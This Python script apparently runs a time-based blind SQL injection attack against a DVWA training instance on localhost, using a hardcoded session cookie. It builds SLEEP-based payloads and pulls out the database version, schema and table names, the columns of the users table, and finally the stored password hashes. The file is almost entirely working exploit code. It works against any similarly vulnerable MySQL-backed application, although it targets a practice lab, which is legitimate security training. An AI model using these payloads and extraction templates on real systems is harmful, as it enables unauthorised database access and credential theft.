from injector import HttpMethod, Injector
import loguru


class MyInjector(Injector):
    def __init__(self) -> None:
        super().__init__()
        self.url = "http://localhost:4080/DVWA/vulnerabilities/sqli/"
        self.http_method = HttpMethod.GET
        self.sleep = 0.012

    def generate_params(
        self,
        condition,
        reverse,
    ):
        payload = (
            f"1' AND(SELECT IF({condition},1,SLEEP({self.sleep})))='a"
            if reverse
            else f"1' AND(SELECT IF({condition},SLEEP({self.sleep}),1))='a"
        )

        return {
            "id": payload,
            "Submit": "Submit",
        }

    def generate_cookies(
        self,
        _condition,
        _reverse,
    ):
        return {
            "PHPSESSID": "gs7u9ku5uqmq48djrc3h9mat5r",
            "security": "low",
        }

    def evaluate_response(
        self,
        _res,
        t0,
        t1,
        reverse,
    ) -> bool:
        return (t1 - t0 > self.sleep) != reverse


def main():

    ### Instanciation of the injector ###
    my_injector = MyInjector()

    ### Boolean test of the sql query ###
    loguru.logger.info("Run a batch of tests to evaluate the quality of the attack")
    my_injector.test()

    ### Search for the version of the database ###
    loguru.logger.info("Search for the version of the database")
    length_condition_template = "(SELECT LENGTH(@@version))={length}"
    substring_condition_template = (
        "(SELECT SUBSTRING(@@version, {position}, {length}))='{substr}'"
    )
    version = my_injector.find_word(
        length_condition_template,
        substring_condition_template,
    )
    loguru.logger.success(f"The version of the DB is {version}")

    ### Search for the available databases
    loguru.logger.info("Search for the available databases")
    count_condition_template = (
        "(SELECT COUNT(schema_name) FROM information_schema.schemata)={length}"
    )
    length_condition_template = "(SELECT LENGTH(schema_name) FROM information_schema.schemata LIMIT {limit} OFFSET {offset})={{length}}"
    substring_condition_template = "(SELECT SUBSTRING(schema_name, {{position}}, {{length}}) FROM information_schema.schemata LIMIT {limit} OFFSET {offset})='{{substr}}'"

    values = my_injector.find_values(
        count_condition_template,
        length_condition_template,
        substring_condition_template,
    )
    loguru.logger.success(f"The available dbs are {', '.join(values)}")

    ### Search for the tables in the database dvwa ###
    loguru.logger.info("Search for the tables in the database dvwa")
    count_condition_template = "(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='dvwa')={length}"
    length_condition_template = "(SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='dvwa' LIMIT {limit} OFFSET {offset})={{length}}"
    substring_condition_template = "(SELECT SUBSTRING(table_name, {{position}}, {{length}}) FROM information_schema.tables WHERE table_schema='dvwa' LIMIT {limit} OFFSET {offset})='{{substr}}'"

    values = my_injector.find_values(
        count_condition_template,
        length_condition_template,
        substring_condition_template,
    )
    loguru.logger.success(f"The available tables of dwva are {', '.join(values)}")

    ### Search for the columns of the table users ###
    loguru.logger.info("Search for the columns of the table users")
    count_condition_template = "(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users')={length}"
    length_condition_template = "(SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='users' LIMIT {limit} OFFSET {offset})={{length}}"
    substring_condition_template = "(SELECT SUBSTRING(column_name, {{position}}, {{length}}) FROM information_schema.columns WHERE table_name='users' LIMIT {limit} OFFSET {offset})='{{substr}}'"

    values = my_injector.find_values(
        count_condition_template,
        length_condition_template,
        substring_condition_template,
    )
    loguru.logger.success(f"The columns of the table users are {', '.join(values)}")

    ### Search for the passwords of the table users ###
    loguru.logger.info("Search for the passwords of the table users")
    count_condition_template = "(SELECT COUNT(password) FROM dvwa.users)={length}"
    length_condition_template = "(SELECT LENGTH(password) FROM dvwa.users LIMIT {limit} OFFSET {offset})={{length}}"
    substring_condition_template = "(SELECT SUBSTRING(password, {{position}}, {{length}}) FROM dvwa.users LIMIT {limit} OFFSET {offset})='{{substr}}'"

    values = my_injector.find_values(
        count_condition_template,
        length_condition_template,
        substring_condition_template,
    )
    loguru.logger.success(f"The passwords of the table users are {', '.join(values)}")


if __name__ == "__main__":
    main()
